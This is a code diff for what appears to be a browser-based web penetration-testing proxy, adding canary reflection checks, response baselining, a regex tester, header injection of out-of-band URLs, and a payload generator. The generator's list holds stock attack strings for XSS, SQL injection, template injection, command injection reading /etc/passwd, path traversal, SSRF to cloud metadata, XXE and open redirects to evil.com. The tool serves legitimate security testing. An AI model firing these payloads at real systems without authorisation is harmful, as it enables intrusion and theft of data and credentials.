@@ -968,6 +968,7 @@ function renderHistory() {
     items = items.filter(e => !/\.(js|mjs|css|png|jpe?g|gif|webp|ico|svg|woff2?|ttf|eot|map)(\?|$)/i.test(e.path));
   }
   if (filterHistReflect) items = items.filter(e => hasReflections(e));
+  if (filterHistCanary) items = items.filter(e => canaryCheckResponse(e));
   // Column checkbox filters
   for (const [field, allowed] of Object.entries(histColFilters)) {
     if (!allowed) continue;
@@ -1095,6 +1096,14 @@ function renderHistory() {
       dot.title = "Reflections detected";
       tr.querySelector("td:nth-child(5)").appendChild(dot);
     }
+    if (canaryCheckResponse(entry)) {
+      const cdot = document.createElement("span");
+      cdot.className = "hist-canary-dot";
+      cdot.title = "Canary reflected: " + canaryValue;
+      tr.querySelector("td:nth-child(5)").appendChild(cdot);
+    }
+    // Record baseline for response diffing
+    baselineRecord(entry);
     tr._histEntry = entry;
     if (histDetailEntry && entry === histDetailEntry) tr.classList.add("hist-selected");
     tr.addEventListener("click", () => openHistDetail(entry));
@@ -5712,6 +5721,137 @@ function schemaGenerate() {
   showToast(`Generated schema: ${Object.keys(endpoints).length} endpoints`);
 }
 
+// ═══════════════════════════ CANARY TOKENS ════════════════════════════════════
+
+let canaryValue = "void_c" + Math.random().toString(36).slice(2, 10);
+let canaryEnabled = false;
+let canaryAutoInject = false;
+let canaryReflections = [];
+let filterHistCanary = false;
+
+function canaryRandomize() {
+  canaryValue = "void_c" + Math.random().toString(36).slice(2, 10);
+  document.getElementById("canary-value").value = canaryValue;
+}
+
+function canaryCheckResponse(entry) {
+  if (!canaryEnabled || !canaryValue) return false;
+  const body = entry.respBody || "";
+  const headers = Object.values(entry.respHeaders || {}).join(" ");
+  return body.includes(canaryValue) || headers.includes(canaryValue);
+}
+
+function canaryScanHistory() {
+  canaryReflections = [];
+  if (!canaryEnabled || !canaryValue) return;
+  for (const e of historyData) {
+    if (canaryCheckResponse(e)) {
+      canaryReflections.push({ url: e.url, method: e.method, status: e.status, time: e.time, host: e.host });
+    }
+  }
+  setBadge("bdg-canary", canaryReflections.length);
+  canaryRenderReflections();
+}
+
+function canaryRenderReflections() {
+  const container = document.getElementById("canary-reflections");
+  const empty = document.getElementById("canary-empty");
+  if (!container) return;
+  container.replaceChildren();
+  if (!canaryReflections.length) { if (empty) container.appendChild(empty); empty?.classList.remove("hidden"); return; }
+  empty?.classList.add("hidden");
+  for (const r of canaryReflections) {
+    const item = el("div", "canary-ref-item");
+    item.appendChild(txt("span", "canary-badge", "REFLECTED"));
+    item.appendChild(txt("span", "method-pill m-" + (r.method||"get").toLowerCase(), r.method || "GET"));
+    item.appendChild(txt("span", "", (r.status || "?") + " " + r.url));
+    item.addEventListener("click", () => { showTab("history"); });
+    container.appendChild(item);
+  }
+}
+
+// ═══════════════════════════ PAYLOAD GENERATOR ════════════════════════════════
+// NOTE: These are intentional security testing payloads — they are strings,
+// not code that gets executed. This is a pentesting tool.
+
+const PAYLOAD_DB = {
+  xss: ['<script>alert(1)</script>','"><img src=x onerror=alert(1)>',"'-alert(1)-'",'<svg onload=alert(1)>','<img src=x onerror=alert(document.domain)>','<body onload=alert(1)>','<iframe src="javascript:alert(1)">','<input onfocus=alert(1) autofocus>','<details open ontoggle=alert(1)>','<marquee onstart=alert(1)>',"javascript:alert(1)",'<a href="javascript:alert(1)">click</a>','<svg><script>alert(1)<\/script></svg>','"><svg onload=alert(1)//',"';alert(1)//"],
+  "xss-polyglot": ['jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</sVg/</xSs/</noscRipt/</Script/<img sRc=x:x onerror=alert(1)>','"><img src=x onerror="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41">',"javascript:\"//'//\\\"//</title></textarea></style></noscript></script><svg/onload=alert(1)//>"],
+  sqli: ["' OR '1'='1","' OR '1'='1'--","' OR '1'='1'/*","1' ORDER BY 1--","' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' AND 1=1--","' AND 1=2--","admin'--","1' AND (SELECT SLEEP(5))--","'; WAITFOR DELAY '0:0:5'--","1 OR 1=1","' OR ''='","1' GROUP BY 1,2,3--","' HAVING 1=1--"],
+  ssti: ["{{7*7}}","${7*7}","<%=7*7%>","#{7*7}","*{7*7}","{{config}}","{{self.__class__}}","{{''.__class__.__mro__[1].__subclasses__()}}","{{request.application.__globals__}}"],
+  cmdi: [";id","|id","$(id)","`id`",";ls","|ls","$(whoami)",";cat /etc/passwd","|cat /etc/passwd",";ping -c 1 OOBURL"],
+  path: ["../../../../etc/passwd","..\\..\\..\\..\\windows\\win.ini","....//....//....//etc/passwd","..%252f..%252f..%252fetc/passwd","/etc/passwd%00"],
+  ssrf: ["http://127.0.0.1","http://localhost","http://[::1]","http://169.254.169.254/latest/meta-data/","http://metadata.google.internal/computeMetadata/v1/","file:///etc/passwd"],
+  xxe: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>','<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OOBURL">]><foo>&xxe;</foo>'],
+  openredirect: ["https://evil.com","//evil.com","/\\evil.com","/%09/evil.com","/%5cevil.com"],
+};
+
+function payloadRender(category) {
+  document.getElementById("payload-list").textContent = (PAYLOAD_DB[category] || []).join("\n");
+}
+
+// ═══════════════════════════ REGEX TESTER ═════════════════════════════════════
+
+function regexTest() {
+  const input = document.getElementById("regex-input").value;
+  const pattern = document.getElementById("regex-pattern").value.trim();
+  const output = document.getElementById("regex-output");
+  const countEl = document.getElementById("regex-match-count");
+  const groupsEl = document.getElementById("regex-groups");
+  if (!pattern || !input) { output.textContent = input; countEl.textContent = ""; groupsEl.replaceChildren(); return; }
+  let flags = "";
+  if (document.getElementById("regex-flag-g").checked) flags += "g";
+  if (document.getElementById("regex-flag-i").checked) flags += "i";
+  if (document.getElementById("regex-flag-m").checked) flags += "m";
+  let re;
+  try { re = new RegExp(pattern, flags); } catch (e) { countEl.textContent = "Invalid: " + e.message; return; }
+  const matches = [];
+  groupsEl.replaceChildren();
+  if (flags.includes("g")) {
+    let m; while ((m = re.exec(input)) !== null) { matches.push({ index: m.index, length: m[0].length, groups: m.slice(1) }); if (!m[0].length) re.lastIndex++; }
+  } else {
+    const m = input.match(re);
+    if (m) matches.push({ index: m.index, length: m[0].length, groups: m.slice(1) });
+  }
+  countEl.textContent = matches.length + " match" + (matches.length !== 1 ? "es" : "");
+  output.replaceChildren();
+  let last = 0;
+  for (const m of matches) {
+    if (m.index > last) output.appendChild(document.createTextNode(input.slice(last, m.index)));
+    const hl = el("span", "regex-match-hl"); hl.textContent = input.slice(m.index, m.index + m.length); output.appendChild(hl);
+    last = m.index + m.length;
+  }
+  if (last < input.length) output.appendChild(document.createTextNode(input.slice(last)));
+  matches.forEach((m, i) => { if (m.groups.length) { const div = el("div", "regex-group"); div.textContent = "Match " + (i+1) + ": " + m.groups.map((g, gi) => "$" + (gi+1) + '="' + (g||"") + '"').join(", "); groupsEl.appendChild(div); } });
+}
+
+// ═══════════════════════════ RESPONSE BASELINE ═══════════════════════════════
+
+let responseBaselines = {};
+
+function baselineRecord(entry) {
+  if (!entry.url || !entry.status) return;
+  let path = ""; try { path = new URL(entry.url).pathname; } catch { return; }
+  const hash = simpleHash(entry.respBody || "");
+  if (!responseBaselines[path]) {
+    responseBaselines[path] = { status: entry.status, length: (entry.respBody || "").length, hash, time: entry.time, url: entry.url };
+  }
+}
+
+function baselineCheck(entry) {
+  if (!entry.url || !entry.status) return null;
+  let path = ""; try { path = new URL(entry.url).pathname; } catch { return null; }
+  const baseline = responseBaselines[path];
+  if (!baseline) return null;
+  const hash = simpleHash(entry.respBody || "");
+  if (hash !== baseline.hash || entry.status !== baseline.status) {
+    return { path, oldStatus: baseline.status, newStatus: entry.status, oldLen: baseline.length, newLen: (entry.respBody || "").length };
+  }
+  return null;
+}
+
+function simpleHash(str) { let h = 0; for (let i = 0; i < str.length; i++) h = ((h << 5) - h + str.charCodeAt(i)) | 0; return h; }
+
 // ═══════════════════════════ RESPONSE INTERCEPTION ═══════════════════════════
 
 let interceptedResponses = [];
@@ -8150,6 +8290,102 @@ document.addEventListener("DOMContentLoaded", () => {
       hdrRenderCustomScan(entry.url, entry.headers, entry.results, null);
       showToast(`Loaded scan for ${domain}`);
     });
+  });
+
+  // ── M&R tab sub-tabs ─────────────────────────────────────────────────
+  initBlock("mr-tab", () => {
+    document.querySelectorAll(".mr-sub-bar .sub-tab[data-mrsub]").forEach(t => {
+      t.addEventListener("click", () => {
+        document.querySelectorAll(".mr-sub-bar .sub-tab").forEach(s => s.classList.remove("active"));
+        t.classList.add("active");
+        document.querySelectorAll(".mr-sub-panel").forEach(p => { p.classList.remove("active"); p.classList.add("hidden"); });
+        const panel = document.getElementById("mr-sub-" + t.dataset.mrsub);
+        if (panel) { panel.classList.add("active"); panel.classList.remove("hidden"); }
+      });
+    });
+    // Auto headers preset
+    document.getElementById("mr-hdr-preset")?.addEventListener("change", e => {
+      if (!e.target.value) return;
+      const ta = document.getElementById("mr-auto-headers");
+      ta.value = ta.value ? ta.value + "\n" + e.target.value : e.target.value;
+      e.target.value = "";
+    });
+  });
+
+  // ── Canary tokens ─────────────────────────────────────────────────────
+  initBlock("canary", () => {
+    document.getElementById("canary-value").value = canaryValue;
+    document.getElementById("canary-randomize").addEventListener("click", canaryRandomize);
+    document.getElementById("canary-copy").addEventListener("click", () => {
+      navigator.clipboard.writeText(canaryValue);
+      showToast("Canary copied: " + canaryValue);
+    });
+    document.getElementById("canary-enabled").addEventListener("change", e => {
+      canaryEnabled = e.target.checked;
+      if (canaryEnabled) { canaryValue = document.getElementById("canary-value").value.trim(); canaryScanHistory(); }
+    });
+    document.getElementById("canary-auto-inject").addEventListener("change", e => { canaryAutoInject = e.target.checked; });
+    document.getElementById("hist-canary-only").addEventListener("change", e => { filterHistCanary = e.target.checked; renderHistory(); });
+  });
+
+  // ── Collaborator in M&R tab ───────────────────────────────────────────
+  initBlock("mr-collab", () => {
+    const COLLAB_HEADERS = ["Referer","X-Forwarded-For","X-Forwarded-Host","Origin","X-Real-IP","X-Client-IP","True-Client-IP","X-Custom-IP-Authorization","Contact","From"];
+    document.getElementById("mr-collab-enable")?.addEventListener("click", () => {
+      const oobUrl = document.getElementById("mr-collab-url").value.trim();
+      if (!oobUrl) { showToast("Enter your OOB URL first"); return; }
+      settings.matchReplace = (settings.matchReplace || []).filter(r => !r._collab);
+      for (const hdr of COLLAB_HEADERS) {
+        settings.matchReplace.push({ enabled: true, type: "req-header", match: "", replace: hdr + ": https://" + hdr.toLowerCase().replace(/[^a-z]/g,"") + "." + oobUrl, scope: "", _collab: true });
+      }
+      saveSettings(); renderMRRules();
+      document.getElementById("mr-collab-status").textContent = COLLAB_HEADERS.length + " rules added";
+      showToast("Collaborator Everywhere enabled");
+    });
+    document.getElementById("mr-collab-disable")?.addEventListener("click", () => {
+      settings.matchReplace = (settings.matchReplace || []).filter(r => !r._collab);
+      saveSettings(); renderMRRules();
+      document.getElementById("mr-collab-status").textContent = "Disabled";
+      showToast("Collaborator rules removed");
+    });
+  });
+
+  // ── Payload generator ─────────────────────────────────────────────────
+  initBlock("payload-gen", () => {
+    payloadRender("xss");
+    document.getElementById("payload-category").addEventListener("change", e => payloadRender(e.target.value));
+    document.getElementById("payload-copy").addEventListener("click", () => {
+      navigator.clipboard.writeText(document.getElementById("payload-list").textContent);
+      showToast("Payloads copied");
+    });
+    document.getElementById("payload-to-intruder").addEventListener("click", () => {
+      const payloads = document.getElementById("payload-list").textContent;
+      document.getElementById("intr-payloads").value = payloads;
+      showTab("intruder");
+      showToast("Payloads loaded into Intruder");
+    });
+  });
+
+  // ── Dencoder sub-tabs ─────────────────────────────────────────────────
+  initBlock("dec-subtabs", () => {
+    document.querySelectorAll(".dec-sub-bar .sub-tab[data-decsub]").forEach(t => {
+      t.addEventListener("click", () => {
+        document.querySelectorAll(".dec-sub-bar .sub-tab").forEach(s => s.classList.remove("active"));
+        t.classList.add("active");
+        document.querySelectorAll(".dec-sub-panel").forEach(p => { p.classList.remove("active"); p.classList.add("hidden"); });
+        const panel = document.getElementById("dec-sub-" + t.dataset.decsub);
+        if (panel) { panel.classList.add("active"); panel.classList.remove("hidden"); }
+      });
+    });
+  });
+
+  // ── Regex tester ──────────────────────────────────────────────────────
+  initBlock("regex-tester", () => {
+    document.getElementById("regex-pattern").addEventListener("input", regexTest);
+    document.getElementById("regex-input").addEventListener("input", regexTest);
+    document.getElementById("regex-flag-g").addEventListener("change", regexTest);
+    document.getElementById("regex-flag-i").addEventListener("change", regexTest);
+    document.getElementById("regex-flag-m").addEventListener("change", regexTest);
   });
 
   initBlock("har-scope", () => {
